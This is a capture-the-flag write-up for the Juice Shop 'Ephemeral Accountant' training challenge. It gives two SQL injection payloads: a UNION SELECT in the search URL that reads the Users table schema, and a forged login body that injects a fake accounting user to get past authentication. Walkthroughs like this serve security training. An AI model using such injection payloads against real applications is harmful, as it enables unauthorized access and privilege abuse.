# Ephemeral Accountant

![image](../../../Assets/8-1.png)

## Clue provided

1. Try to create the needed user "out of thin air".
2. The user literally needs to be ephemeral as in "lasting for only a short time".
3. Registering normally with the user’s email address will then obviously not solve this challenge. The Juice Shop will not even let you register as acc0unt4nt@juice-sh.op, as this would make the challenge unsolvable for you.
4. Getting the user into the database some other way will also fail to solve this challenge. In case you somehow managed to do so, you need to restart the Juice Shop application in order to wipe the database and make the user disappear again.

## Solution

### Identifying vulnerability

We can find column names by using the following payload:

```
http://127.0.0.1:3000/rest/products/search?q=%27))%20UNION%20SELECT%201,sql,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27---
```

![image](../../../Assets/8-2.png)

### Exploiting the vulnerability

We can create a temporary user by intercepting login request and modifying the json body to the following:

```json
{"email":"' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `test123`, 1 AS `isActive`, 12983283 AS `createdAt`, 121211 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--","password":"test"}
```

![image](../../../Assets/8-3.png)

### Result

![image](../../../Assets/8-4.png)